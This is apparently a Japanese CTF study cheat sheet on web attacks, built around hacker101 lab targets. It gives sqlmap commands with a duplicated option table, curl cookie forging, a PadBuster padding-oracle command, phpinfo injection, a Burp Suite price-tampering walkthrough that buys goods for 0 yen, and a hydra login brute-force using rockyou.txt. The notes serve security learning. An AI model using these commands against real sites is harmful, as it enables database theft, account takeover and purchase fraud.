# webExploit

***

## SQLインジェクション
### SQLmap
<details><summary>詳細</summary>  
  
- GETメソッドの場合の例:
```
python sqlmap.py -u "http://example.jp/sql_injection-003.php?ID=1&PWD=2"
```
- POSTメソッドの場合の例:
```
python sqlmap.py -u "http://example.jp/sql_injection-003.php" --data "ID=1&PWD=2"
```
|コマンド(center)|	説明(center)|
|---------------|-------------|
|`--dbs	`  |データベースの一覧を取得|
|`--tables`	|テーブルの一覧を取得|
|`-D`      	|データベースの指定(PostgreSQLではサーチパス)|
|`-T`	      |テーブルの指定|
|--colums	|-Tと一緒に使いテーブル定義を一覧|
|--dump	  |-Tと一緒に使いテーブルデータをダンプ|

- 脆弱性診断
```
./sqlmap.py -u "URL" --data="ID=1&PWD=2" --dbms PostgreSQL
```
- 主要オプション

| オプション          | 説明 |
|---------------------|------|
| `-u`                | 攻撃対象のURLを指定します。 |
| `-p`                | 特定のパラメータを攻撃対象にします。 |
| `--method`          | HTTPリクエストメソッド（GET、POSTなど）を指定します。 |
| `--data`            | POSTリクエストのデータを指定します。 |
| `--cookie`          | HTTPリクエストに使用するクッキーを指定します。 |
| `--user-agent`      | HTTPリクエストのUser-Agentヘッダーを指定します。 |
| `--random-agent`    | ランダムなUser-Agentヘッダーを使用します。 |
| `--referer`         | HTTPリクエストのRefererヘッダーを指定します。 |
| `-b`                | HTTPレスポンスでのCookieベースのSQLインジェクションのテスト。 |
| `-D`                | データベース名を指定します。 |
| `-T`                | テーブル名を指定します。 |
| `-C`                | カラム名を指定します。 |
| `--dump`            | データベースのデータをダンプします。 |
| `--search`          | データベース内の特定の文字列を検索します。 |
| `--sql-query`       | 任意のSQLクエリを実行します。 |
| `--risk`            | テストのリスクレベルを設定（1-3）。 |
| `--level`           | テストの詳細レベルを設定（1-5）。 |
| `--time-sec`        | タイムベースのブラインドSQLインジェクションの遅延秒数を指定します。 |
| `--code`            | HTTPレスポンスコード（200、404など）を指定します。 |
| `--string`          | ブールベースのブラインドSQLインジェクションで使用する文字列を指定します。 |
| `--not-string`      | ブールベースのブラインドSQLインジェクションで使用する、含まれていない文字列を指定します。 |
| `--count`           | レコードの数を表示します。 |
| `--union-cols`      | UNIONベースのSQLインジェクションのカラム数を指定します。 |
| `--union-char`      | UNIONベースのSQLインジェクションの文字セットを指定します。 |
| `--output-dir`      | 出力ディレクトリを指定します。 |
| `--flush-session`   | セッションファイルを削除します。 |
| `--batch`           | インタラクティブなプロンプトをスキップします（すべてのプロンプトに自動的に「yes」と答えます）。 |
| `-u`                | 攻撃対象のURLを指定します。 |
| `-p`                | 特定のパラメータを攻撃対象にします。 |
| `--method`          | HTTPリクエストメソッド（GET、POSTなど）を指定します。 |
| `--data`            | POSTリクエストのデータを指定します。 |
| `--cookie`          | HTTPリクエストに使用するクッキーを指定します。 |
| `--user-agent`      | HTTPリクエストのUser-Agentヘッダーを指定します。 |
| `--random-agent`    | ランダムなUser-Agentヘッダーを使用します。 |
| `--referer`         | HTTPリクエストのRefererヘッダーを指定します。 |
| `-b`                | HTTPレスポンスでのCookieベースのSQLインジェクションのテスト。 |
| `-D`                | データベース名を指定します。 |
| `-T`                | テーブル名を指定します。 |
| `-C`                | カラム名を指定します。 |
| `--dump`            | データベースのデータをダンプします。 |
| `--search`          | データベース内の特定の文字列を検索します。 |
| `--sql-query`       | 任意のSQLクエリを実行します。 |
| `--risk`            | テストのリスクレベルを設定（1-3）。 |
| `--level`           | テストの詳細レベルを設定（1-5）。 |
| `--time-sec`        | タイムベースのブラインドSQLインジェクションの遅延秒数を指定します。 |
| `--code`            | HTTPレスポンスコード（200、404など）を指定します。 |
| `--string`          | ブールベースのブラインドSQLインジェクションで使用する文字列を指定します。 |
| `--not-string`      | ブールベースのブラインドSQLインジェクションで使用する、含まれていない文字列を指定します。 |
| `--count`           | レコードの数を表示します。 |
| `--union-cols`      | UNIONベースのSQLインジェクションのカラム数を指定します。 |
| `--union-char`      | UNIONベースのSQLインジェクションの文字セットを指定します。 |
| `--output-dir`      | 出力ディレクトリを指定します。 |
| `--flush-session`   | セッションファイルを削除します。 |
| `--batch`           | インタラクティブなプロンプトをスキップします（すべてのプロンプトに自動的に「yes」と答えます）。 |

参考資料：  
[SQL](https://qiita.com/shyamahira/items/9f80d16c3436f9dea753)  
[アロワナ飼いたい](https://iomat.hatenablog.com/entry/2022/08/19/173528)  

</details>  


### SQLコマンド

<details><summary>詳細</summary> 

- SQLインジェクションの仕組み  
![image](https://github.com/user-attachments/assets/aafebcec-8229-44ba-b16b-80276ec19cbd)

[SQLインジェクション【SQL Injection】とは｜図でわかる脆弱性の仕組み](https://www.ubsecure.jp/blog/sql-injection)  ここにすべてわかりやすく書かれてる。


参考資料：  
[SQLインジェクションでデータベースを攻撃(!)してみよう](https://marunouchi-tech.i-studio.co.jp/2056/)  
[SQLインジェクション【SQL Injection】とは｜図でわかる脆弱性の仕組み](https://www.ubsecure.jp/blog/sql-injection)  

</details> 

***

## Cookie
### curlでCookieを保存、送信する

<details><summary>詳細</summary> 

```
curl -b "KEY=VALUE" http://localhost
```

例
```
curl 10.6.255.116:3000/orders -b "bakeSaleVolunteer=dHJ1ZQ%3D%3D"
```

参考資料：
[curlでCookieを保存、送信する](https://qiita.com/shyamahira/items/9f80d16c3436f9dea753)
[cookie の取得方法と curl で cookie を送信する方法](https://qiita.com/fmyuk/items/dec3992caa4fd4f574fd)

</details>

## Padding Oracle Attack
<details><summary>詳細</summary> 

### そもそもAESとは？
ブロック暗号の代表格。ブロック暗号とは、平文をN文字ずつ分けそれぞれ暗号化するような感じです。`AESでは16文字ごと`分けています。その暗号化の方式はいくつかあり、AESでは`ECB, CBC, CFBモード`などがあります。

### PadBuster
パディングオラクルは比較的簡単に悪用できるが、攻撃を自動化する良い方法がなければ、悪用する行為に時間がかかる。 幸い、このプロセスを自動化する方法がある。
PadBusterがあれば比較的簡単に実行可能。
```
./padBuster.pl [URL] EncryptedSample BlockSize [options]
```

例）
```
./padBuster.pl https://3e3f879427dcb8d345e5a474b8d51981.ctf.hacker101.com/?post=N4A5QwDUUQQoNdyGs03k5HPeIFRt8dO!LjR3nL9kSe0yHp58IDtjfQ-iz0LRA6D-VItAgvHCFdPJ2bcGSrp!KCJyBpWYzbmBAMwhckyMEA!MCR6eLof5tEmP8NAIddmEnktsU3c6FjeYc5l8!v3YnnHMic5z-!El9LkyAyuLzu8d2OD1YLrOFzqWjDX91rHl4RwzvjE3RezRomoKA37Q4w~~ 16-encoding
```




参考資料：  
[Padding Oracle Attack 分かりやすく解説したい](https://partender810.hatenablog.com/entry/2021/06/08/225105)
[PadBuster](https://github.com/AonCyberLabs/PadBuster)
[PadBuster によるパディング Oracle 攻撃の自動化](https://cyber.aon.com/aon_cyber_labs/automated-padding-oracle-attacks-with-padbuster/)

</details>

***

## PHP
<details><summary>詳細</summary> 

下記のようなものを受け付けるフォームが存在したりする。
```
<?php
phpinfo() ;
?>
```
![image](https://github.com/user-attachments/assets/1c837b60-7b70-4e60-b947-02a569b03db7)

これによりPHPのインフォメーション情報を見ることができる。
また、PHP関連のコマンドが使用できてしまう。

| コマンド          | 説明 |
|-------------------|------|
| `php -i`          | コマンドラインで `phpinfo()` と同じ情報を表示します。 |
| `php -r '...'`    | 特定のPHPコードをコマンドラインで実行します。例：`php -r 'echo phpinfo();'` |
| `php -m`          | インストールされているPHPモジュールの一覧を表示します。 |
| `php --ini`       | PHPの設定ファイル（php.ini）の場所を表示します。 |
| `php -v`          | PHPのバージョン情報を表示します。 |
| `php -l`          | 指定したPHPファイルの文法チェックを行います。例：`php -l file.php` |
| `php -f`          | 指定したPHPファイルを実行します。例：`php -f file.php` |
| `php -S`          | 組み込みウェブサーバーを起動します。例：`php -S localhost:8000` |
| `php -a`          | 対話型シェル（インタラクティブモード）を起動します。 |

</details>

***

## Burp Suite

<details><summary>詳細</summary> 

### Settings
[KaliのBurpSuiteの簡単なセットアップ方法](https://qiita.com/labpixel/items/e42f8f28ccb78d057cb1)

### 使用例
#### Petshop Proの問題
- 購入画面 

![image](https://github.com/user-attachments/assets/09e6c43b-8cc4-4d17-aab3-b630cce23b69)

カートに追加できる。２つともカートへ入れてみる。

![image](https://github.com/user-attachments/assets/fdc89c26-bf3e-42be-a1ed-a07436835303)

CheckOutするときに、Cart内のデータが送信されている。

![image](https://github.com/user-attachments/assets/04c38031-f6f9-4a4d-b3b0-23c66127b3a2)

これらをURLデコードすると中身がわかる。これらを改ざんしてみる。

![image](https://github.com/user-attachments/assets/4f663c37-d7c1-4975-8fe1-a813b0f00318)    

"price": 0.00にしてみる。

![image](https://github.com/user-attachments/assets/1addabe3-158a-45e9-9cc7-6334c3fcf8fe)


![image](https://github.com/user-attachments/assets/16039a43-e031-4ab6-9c81-06b17a5949e6)

こんな感じでコピペして、値を改ざんできる。

![image](https://github.com/user-attachments/assets/feb98e69-9387-4022-bc94-7935984d1097)

すると商品を０円で購入できる。

</details>

***

### hydra

<details><summary>詳細</summary>

#### hydraとは
パスワードクラックを行うツールです。  
SSHやFTPなどのサービスや、webアプリのログインフォームに対して攻撃が出来ます。  
攻撃時は、あらかじめ攻撃する値を記載したファイルを利用することが出来ます。  

#### 使い方

```  
hydra -L [ユーザー名リスト] -P [パスワードリスト] [モジュール]://[ターゲットURL]/[パス]:[パラメータ]:[失敗時のメッセージ]
```

(例)
```
hydra -L /ShareVM/names.txt -P /usr/share/wordlists/rockyou.txt https-post-form://55b6113105a5aa5d6f41ba91e2c857f4.ctf.hacker101.com "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

参考資料：  
[kali linuxでhydraを使ってパスワードクラックをしてみた](https://qiita.com/miya_zato/items/0c32dc71208460515e34)  
[names.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt?source=post_page-----8001ba11ed9c--------------------------------) ダウンロード先  

</details>


錬成環境：
[hacker101](https://ctf.hacker101.com/ctf)




- 教訓：サーバーに入る系の問題で管理者権限が与えられていない場合、 sudo -lを使用すると何をしたらいいのかわかることがある。


